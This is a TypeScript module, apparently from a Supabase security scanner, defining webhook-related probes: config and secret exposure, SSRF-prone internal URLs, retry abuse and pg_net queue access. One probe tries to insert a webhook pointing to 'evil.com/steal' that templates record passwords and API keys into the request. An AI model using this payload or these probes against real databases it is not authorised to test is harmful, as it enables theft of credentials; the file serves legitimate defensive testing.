/**
 * Webhook attacks
 * Tests for database webhook vulnerabilities
 */

import type { AttackVector } from '$lib/types/attacks';

export const webhookAttacks: AttackVector[] = [
	{
		id: 'webhook-config-exposure',
		name: 'Webhook Configuration Exposure',
		description: 'Check if webhook configurations are accessible',
		category: 'rls',
		severity: 'high',
		async execute(context) {
			try {
				// Check for webhook configuration tables
				const tables = [
					'supabase_functions.hooks',
					'net.http_request_queue',
					'webhooks',
					'webhook_configs',
					'event_triggers'
				];

				const exposed: Array<{ table: string; data: unknown }> = [];

				for (const table of tables) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/${table}?select=*&limit=5`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					const data = await res.json();
					if (Array.isArray(data) && data.length > 0) {
						exposed.push({ table, data: data.slice(0, 2) });
					}
				}

				return {
					breached: exposed.length > 0,
					status: exposed.length > 0 ? 'breached' : 'secure',
					summary: exposed.length > 0
						? `Webhook configs exposed: ${exposed.map(e => e.table).join(', ')}`
						: 'Webhook configurations protected',
					evidence: exposed.length > 0 ? { tables: exposed } : undefined
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Webhook configs not accessible' };
			}
		}
	},
	{
		id: 'webhook-secret-exposure',
		name: 'Webhook Secret Token Exposure',
		description: 'Check if webhook secrets are exposed in configs',
		category: 'rls',
		severity: 'critical',
		async execute(context) {
			try {
				const res = await fetch(
					`${context.supabaseUrl}/rest/v1/webhooks?select=*`,
					{
						headers: {
							'apikey': context.anonKey,
							'Authorization': `Bearer ${context.anonKey}`
						},
						signal: context.signal
					}
				);

				const data = await res.json();

				if (Array.isArray(data) && data.length > 0) {
					// Check for secret fields
					const secretFields = ['secret', 'token', 'api_key', 'auth_header', 'signing_secret'];
					const exposedSecrets = data.filter(webhook =>
						secretFields.some(field =>
							webhook[field] && typeof webhook[field] === 'string' && webhook[field].length > 0
						)
					);

					return {
						breached: exposedSecrets.length > 0,
						status: exposedSecrets.length > 0 ? 'breached' : 'secure',
						summary: exposedSecrets.length > 0
							? `${exposedSecrets.length} webhooks expose secret tokens!`
							: 'Webhook secrets not exposed',
						evidence: exposedSecrets.length > 0 ? { count: exposedSecrets.length } : undefined
					};
				}

				return {
					breached: false,
					status: 'secure',
					summary: 'No webhook configurations found'
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Webhook data not accessible' };
			}
		}
	},
	{
		id: 'webhook-ssrf-internal',
		name: 'Webhook SSRF to Internal Services',
		description: 'Check for SSRF via webhook URLs pointing to internal services',
		category: 'rls',
		severity: 'critical',
		async execute(context) {
			try {
				const res = await fetch(
					`${context.supabaseUrl}/rest/v1/webhooks?select=url,endpoint,callback_url`,
					{
						headers: {
							'apikey': context.anonKey,
							'Authorization': `Bearer ${context.anonKey}`
						},
						signal: context.signal
					}
				);

				const data = await res.json();

				if (Array.isArray(data) && data.length > 0) {
					const internalPatterns = [
						'localhost', '127.0.0.1', '0.0.0.0',
						'169.254.169.254', // AWS metadata
						'metadata.google', // GCP metadata
						'10.', '172.16.', '192.168.', // Private IPs
						'internal', 'private', 'local'
					];

					const ssrfUrls = data.filter(webhook => {
						const url = webhook.url || webhook.endpoint || webhook.callback_url || '';
						return internalPatterns.some(pattern => url.toLowerCase().includes(pattern));
					});

					return {
						breached: ssrfUrls.length > 0,
						status: ssrfUrls.length > 0 ? 'breached' : 'secure',
						summary: ssrfUrls.length > 0
							? `${ssrfUrls.length} webhooks point to internal services (SSRF risk)`
							: 'No internal webhook URLs found',
						evidence: ssrfUrls.length > 0 ? { count: ssrfUrls.length } : undefined
					};
				}

				return {
					breached: false,
					status: 'secure',
					summary: 'No webhooks accessible'
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Webhook URLs not accessible' };
			}
		}
	},
	{
		id: 'webhook-payload-injection',
		name: 'Webhook Payload Injection',
		description: 'Test for webhook payload manipulation',
		category: 'rls',
		severity: 'high',
		async execute(context) {
			try {
				// Try to insert malicious webhook data
				const maliciousPayloads = [
					{
						url: 'http://evil.com/steal?data={{record.password}}',
						events: ['INSERT'],
						payload_template: '{"secret": "{{record.api_key}}"}'
					}
				];

				for (const payload of maliciousPayloads) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/webhooks`,
						{
							method: 'POST',
							headers: {
								'Content-Type': 'application/json',
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`,
								'Prefer': 'return=representation'
							},
							body: JSON.stringify(payload),
							signal: context.signal
						}
					);

					if (res.ok || res.status === 201) {
						return {
							breached: true,
							status: 'breached',
							summary: 'Can create webhooks with template injection!',
							evidence: { payload }
						};
					}
				}

				return {
					breached: false,
					status: 'secure',
					summary: 'Webhook creation properly restricted'
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Cannot create webhooks' };
			}
		}
	},
	{
		id: 'webhook-retry-abuse',
		name: 'Webhook Retry Mechanism Abuse',
		description: 'Check if webhook retries can be abused for DoS',
		category: 'rls',
		severity: 'medium',
		async execute(context) {
			try {
				// Check for webhook retry configurations
				const res = await fetch(
					`${context.supabaseUrl}/rest/v1/webhooks?select=*,retry_config,max_retries,retry_interval`,
					{
						headers: {
							'apikey': context.anonKey,
							'Authorization': `Bearer ${context.anonKey}`
						},
						signal: context.signal
					}
				);

				const data = await res.json();

				if (Array.isArray(data) && data.length > 0) {
					const highRetry = data.filter(w =>
						(w.max_retries && w.max_retries > 10) ||
						(w.retry_config?.max_attempts && w.retry_config.max_attempts > 10)
					);

					return {
						breached: highRetry.length > 0,
						status: highRetry.length > 0 ? 'breached' : 'secure',
						summary: highRetry.length > 0
							? `${highRetry.length} webhooks with high retry count (DoS risk)`
							: 'Webhook retry limits reasonable',
						evidence: highRetry.length > 0 ? { count: highRetry.length } : undefined
					};
				}

				return {
					breached: false,
					status: 'secure',
					summary: 'Webhook retry configs not accessible'
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not check webhook retries' };
			}
		}
	},
	{
		id: 'webhook-http-queue',
		name: 'HTTP Request Queue Exposure',
		description: 'Check if pg_net HTTP queue is accessible',
		category: 'rls',
		severity: 'high',
		async execute(context) {
			try {
				// Check net extension tables
				const tables = [
					'net._http_response',
					'net.http_request_queue'
				];

				const exposed: string[] = [];

				for (const table of tables) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/${table}?select=*&limit=5`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					const data = await res.json();
					if (Array.isArray(data)) {
						exposed.push(table);
					}
				}

				return {
					breached: exposed.length > 0,
					status: exposed.length > 0 ? 'breached' : 'secure',
					summary: exposed.length > 0
						? `pg_net tables exposed: ${exposed.join(', ')}`
						: 'pg_net tables protected',
					evidence: exposed.length > 0 ? { tables: exposed } : undefined
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'pg_net not accessible' };
			}
		}
	}
];
